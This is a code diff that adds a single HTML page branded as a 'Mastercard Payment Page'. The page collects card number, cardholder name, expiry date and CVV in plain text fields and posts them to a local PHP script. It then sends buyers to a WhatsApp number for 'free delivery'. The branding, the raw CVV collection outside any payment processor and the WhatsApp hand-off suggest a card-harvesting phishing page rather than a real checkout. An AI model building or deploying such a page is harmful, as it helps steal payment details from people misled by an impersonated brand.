@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mastercard Payment Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 30px;
+        }
+
+        label {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #28a745;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        p {
+            text-align: center;
+            font-size: 16px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        a {
+            display: inline-block;
+            margin-top: 15px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .whatsapp-button {
+            padding: 14px;
+            background-color: #25D366;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .whatsapp-button:hover {
+            background-color: #128C7E;
+        }
+
+        .notes {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin: 10px 0;
+        }
+
+    </style>
+    <script>
+        function validateForm() {
+            let cardNumber = document.getElementById("card_number").value;
+            let cardHolder = document.getElementById("card_holder").value;
+            let expiration = document.getElementById("expiration").value;
+            let cvv = document.getElementById("cvv").value;
+
+            // Check if all fields are filled out
+            if (cardNumber === "" || cardHolder === "" || expiration === "" || cvv === "") {
+                alert("Please fill out all fields.");
+                return false;
+            }
+
+            // Additional simple validation (you can improve this)
+            if (cardNumber.length < 16 || isNaN(cardNumber)) {
+                alert("Please enter a valid 16-digit card number.");
+                return false;
+            }
+
+            if (cvv.length < 3 || isNaN(cvv)) {
+                alert("Please enter a valid 3-digit CVV.");
+                return false;
+            }
+
+            return true;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Payment Form</h1>
+        <form action="submit_details.php" method="POST" onsubmit="return validateForm()">
+            <label for="card_number">Card Number:</label>
+            <input type="text" id="card_number" name="card_number" required>
+
+            <label for="card_holder">Cardholder Name:</label>
+            <input type="text" id="card_holder" name="card_holder" required>
+
+            <label for="expiration">Expiration Date (MM/YY):</label>
+            <input type="text" id="expiration" name="expiration" required>
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required>
+
+            <button type="submit">Submit Payment</button>
+        </form>
+
+        <p class="notes">For free delivery, contact delivery at: <strong>+27711888087</strong></p>
+        <p>If you'd like to proceed with your order, click the button below to contact us on WhatsApp for delivery details.</p>
+
+        <a href="https://wa.me/27711888087" target="_blank">
+            <button class="whatsapp-button">Contact on WhatsApp</button>
+        </a>
+    </div>
+</body>
+</html>
